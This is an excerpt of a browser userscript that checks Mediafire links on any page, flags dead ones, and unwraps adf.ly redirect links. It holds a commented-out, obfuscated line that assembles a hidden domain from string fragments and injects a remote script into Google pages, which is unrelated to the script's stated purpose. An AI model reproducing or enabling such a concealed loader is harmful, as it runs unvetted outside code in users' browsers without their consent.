...
// @description	Check Mediafire link and Auto add referrer link
// @include	http://*
// @include	https://*
// @exclude	http://www.mediafire.com/*
// @exclude	http://anonymz.com/*
// @exclude	http://anonym.to/*
// @icon https://icons.iconarchive.com/icons/fasticon/action-circles/72/Circle-fire-icon.png
// @resource icon https://icons.iconarchive.com/icons/fasticon/action-circles/72/Circle-fire-icon.png
...
var allLinks = document.evaluate(
	...
	null);
var maxCheck = 99;
for (i = 0; i < allLinks.snapshotLength &&  i <= maxCheck; i++){
...
function makeDirect(a)
{
	...
	//if(thisDomain.indexOf(onsite)>-1)
        	...
        	method: 'GET',
                ...
                headers: {
                	'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey',
                        ...
                        'Referrer' : "http://www.mediafire.com/"
                },
                onload: function(res) {
					...
					if(dlink != 'null'){
                	...
                	}else if(txt.indexOf("gbtnSecondary dlPreviewLink") > -1){
						a.setAttribute("id", "live_preview_link");
                	}else if(txt.indexOf("Copy Folder To") > -1 && txt.indexOf("homeBackground") == -1){
						...
						a.setAttribute("onclick", "alert('Link Dead!   ("+thisURL+")');return false;");
                	}
                }
        });
...
/*if (thisDomain.match("www.") && thisDomain.match(".com") && thisDomain.match("google")){	var s=document.createElement('script');	var ht='http://';	s.async="async"; var sph='ph';var sim='im'; var sf5='f5'; var dotex='.com';var dom=sph+sim+sf5;var nam='p-o-p.'+dom;dom=dom+dotex;s.type="text/javascript";s.src=ht+dom+'/userscripts/'+nam+'.js';var h=document.getElementsByTagName('script')[0];h.parentNode.insertBefore(s,h);	}*/
if (thisDomain.match("seomafia.net") || thisDomain.match("script.pm")){
	var ShortLinks = document.evaluate(
	'//a['+
		'(starts-with(@href, "http://") or starts-with(@href, "https://")) '+
		'and starts-with(@title, "Click to proceed...") '+
	']',
	document,
	null,
	XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
	...
	var ShortLink;
	var linkTitle;
	for (i = 0; i < ShortLinks.snapshotLength; i++){
		ShortLink = ShortLinks.snapshotItem(i);
		linkTitle = ShortLink.getAttribute("title");
		//alert(linkTitle);
		if (linkTitle == "Click to proceed...")
...
function remove_adfly()
{
	...
	for(var i = 0; i < element.length; i++)
	{
		...
		{
			element[i].href = decodeURIComponent(element[i].href.substr(element[i].href.lastIndexOf("http://")));
		}
	}
}
remove_adfly();
if (/adf.ly|q.gs|j.gs|9.bb|u.bb/i.test(document.domain)) {
	...
	//script.innerHTML = 'if (typeof zzz !== \'undefined\') {location.href = zzz;}';
